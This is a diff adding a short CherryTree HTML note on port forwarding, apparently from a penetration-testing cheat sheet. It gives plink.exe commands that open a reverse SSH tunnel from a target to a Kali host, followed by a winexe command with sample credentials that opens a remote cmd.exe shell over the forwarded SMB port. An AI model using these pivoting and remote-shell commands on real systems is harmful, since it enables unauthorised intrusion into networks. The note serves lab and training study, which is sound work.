@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Port Forwarding</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Port Forwarding</h1><br/>Explanation:<br />	plink.exe requires you to SSH to Kali, and then uses the SSH tunnel to forward ports.<br />Useage:<br />	plink.exe &lt;kaliuser(root)&gt;@&lt;kaliIP&gt; -R &lt;kaliport&gt;:&lt;target-IP(probably 127.0.0.1)&gt;:&lt;target-port&gt;<br />Example:<br />	plink.exe root@192.168.11.5 -R 445:127.0.0.1:445 	(hit enter a couple times and you will be kicked out of your shell).<br />	winexe -U admin%password123 //127.0.0.1 cmd.exe	(you will be logging in via the target localport 445)</div></body></html>
